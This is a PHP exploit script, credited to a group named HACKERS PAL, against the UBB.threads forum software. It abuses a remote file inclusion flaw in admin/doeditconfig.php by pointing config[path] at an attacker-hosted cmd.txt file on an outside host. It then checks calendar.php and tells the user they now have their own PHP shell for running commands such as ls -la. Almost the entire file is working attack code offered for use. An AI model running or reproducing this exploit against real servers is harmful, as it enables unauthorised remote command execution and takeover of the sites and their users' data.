<? #!/usr/bin/php -q -d short_open_tag=on
/*
/*   UBB.threads Multiple vulnerabilities
/*  This exploit should allow you to execute commands
/*            By : HACKERS PAL
/*             WwW.SoQoR.NeT
*/
print_r('
/**********************************************/
/*       UBB.threads Command Execution        */
/*    by HACKERS PAL <security@soqor.net>     */
/*         site: http://www.soqor.net         */');
if ($argc<2) {
print_r('
/* --                                         */
/* Usage: php '.$argv[0].' host
/* Example:                                   */
/*    php '.$argv[0].' http://localhost/
/**********************************************/
');
die;
}
error_reporting(0);
ini_set("max_execution_time",0);

$url=$argv[1]."/";
$exploit="admin/doeditconfig.php?thispath=../includes&config[path]=http://psevil.googlepages.com/cmd.txt?";
$page=$url.$exploit;
          Function get_page($url)
          {

                   if(function_exists("file_get_contents"))
                   {

                        $contents = file_get_contents($url);

                           }
                           else
                           {
                               $fp=fopen("$url","r");
                               while($line=fread($fp,1024))
                               {
                                $contents=$contents.$line;
                               }


                                   }
                        return $contents;
          }

      $page    = get_page($page);

      $newpage = get_page($url."calendar.php");

      if(eregi("Cannot execute a blank command",$newpage))
      {
        Die("\n[+] Exploit Finished\n[+] Go To : ".$url."calendar.php?cmd=ls
-la\n[+] You Got Your Own PHP Shell\n/*        Visit us : WwW.SoQoR.NeT
*/\n/**********************************************/");
              }
              Else
              {
                 Die("\n[-] Exploit Failed\n/*        Visit us : WwW.SoQoR.NeT
*/\n/**********************************************/");
                 }
?>
